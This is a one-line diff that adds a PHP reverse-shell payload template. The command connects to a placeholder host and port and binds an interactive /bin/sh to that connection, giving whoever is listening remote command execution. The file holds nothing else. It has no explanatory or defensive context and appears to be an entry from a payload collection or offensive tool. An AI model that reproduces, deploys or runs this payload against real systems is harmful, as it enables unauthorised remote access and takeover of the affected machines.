@@ -1,0 +1,1 @@
+php -r '$s=@fsockopen("{{HOST}}",{{PORT}});if(!$s)exit(1);$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);if(!is_resource($p))exit(1);exit(proc_close($p));'
